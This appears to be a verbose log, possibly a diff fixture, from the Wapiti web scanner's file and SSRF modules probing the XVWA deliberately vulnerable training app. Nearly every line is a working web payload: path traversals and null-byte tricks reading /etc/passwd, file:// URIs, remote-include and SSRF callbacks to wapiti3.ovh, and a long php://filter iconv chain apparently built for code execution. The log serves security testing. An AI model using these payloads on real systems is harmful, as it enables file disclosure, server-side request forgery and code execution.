+2024-03-20 15:24:47.305 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&item=10
+2024-03-20 15:24:47.316 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&item=10
+2024-03-20 15:24:47.327 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:47.339 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&item=10
+2024-03-20 15:24:47.353 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:47.368 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 15:24:47.380 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 15:24:47.392 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%2Fetc%2Fpasswd
+2024-03-20 15:24:47.406 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%2Fetc%2Fpasswd%00
+2024-03-20 15:24:47.419 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%2Fetc%2Fservices
+2024-03-20 15:24:47.433 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%2Fetc%2Fservices%00
+2024-03-20 15:24:47.443 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 15:24:47.453 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 15:24:47.466 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 15:24:47.474 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:47.486 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:47.500 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 15:24:47.515 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 15:24:47.524 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 15:24:47.535 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:47.548 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:47.561 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:47.575 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:47.587 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:47.599 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:47.608 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:47.620 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:47.631 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:47.641 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:47.652 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:47.665 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:47.678 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 15:24:47.690 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:47.703 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:47.714 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:47.725 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:47.737 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:47.747 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:47.757 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:47.767 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:47.776 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:47.786 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:47.795 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:47.805 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:47.815 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:47.825 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:47.837 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:47.849 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:47.860 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:47.872 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:47.883 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:47.894 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:47.905 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:47.918 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:47.929 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:47.943 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:47.952 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 15:24:47.963 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 15:24:47.974 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 15:24:47.986 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 15:24:47.998 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 15:24:48.009 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 15:24:48.021 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:48.032 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:48.070 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 15:24:48.084 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+2024-03-20 15:24:48.094 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=
+2024-03-20 15:24:48.095 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F5p5lyd%2F1%2F6974656d%2F&search=
+2024-03-20 15:24:48.105 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F5p5lyd%2F1%2F736561726368%2F
+2024-03-20 15:24:48.126 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10
+2024-03-20 15:24:48.126 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F5p5lyd%2F2%2F736561726368%2F&item=10
+2024-03-20 15:24:48.136 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F5p5lyd%2F2%2F6974656d%2F
